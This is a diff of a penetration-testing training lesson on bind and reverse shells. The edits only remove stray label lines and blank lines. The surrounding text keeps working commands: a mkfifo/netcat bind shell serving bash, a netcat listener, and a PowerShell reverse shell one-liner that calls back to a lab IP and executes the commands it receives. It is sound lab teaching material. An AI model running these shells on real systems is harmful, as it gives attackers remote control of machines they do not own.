@@ -319,8 +319,6 @@ On the server-side, we will need to specify the `directory`, `shell`, `listener`
 
 **No. 1: Server - Binding a Bash shell to the TCP session**
 
-&#x20; Bind Shells
-
 ```shell-session
 Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
 ```
@@ -331,8 +329,6 @@ Back on the client, use Netcat to connect to the server now that a shell on the 
 
 **No. 2: Client - Connecting to bind shell on target**
 
-&#x20; Bind Shells
-
 ```shell-session
 root@htb[/htb]$ nc -nv 10.129.41.200 7777
 
@@ -342,10 +338,6 @@ Target@server:~$
 We will notice that we have successfully established a bind shell session with the target. Keep in mind that we had complete control over both our attack box and the target system in this scenario, which isn't typical. We worked through these exercises to understand the basics of the bind shell and how it works without any security controls (NAT enabled routers, hardware firewalls, Web Application Firewalls, IDS, IPS, OS firewalls, endpoint protection, authentication mechanisms, etc...) in place or exploits needed. This fundamental understanding will be helpful as we get into more challenging situations and realistic scenarios working with vulnerable systems.
 
 As mentioned earlier in this section, it is also good to remember that the bind shell is much easier to defend against. Since the connection will be received incoming, it is more likely to get detected and blocked by firewalls even if standard ports are used when starting a listener. There are ways to get around this by using a reverse shell which we will discuss in the next section.
-
-
-
-
 
 ## Reverse Shells
 
@@ -373,8 +365,6 @@ We can start a Netcat listener on our attack box as the target spawns.
 
 **Server (`attack box`)**
 
-&#x20; Reverse Shells
-
 ```shell-session
 root@htb[/htb]$ sudo nc -lvnp 443
 Listening on 0.0.0.0 443
@@ -393,8 +383,6 @@ This is an excellent question to ask any time we are trying to establish a rever
 On the Windows target, open a command prompt and copy & paste this command:
 
 **Client (target)**
-
-&#x20; Reverse Shells
 
 ```cmd-session
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
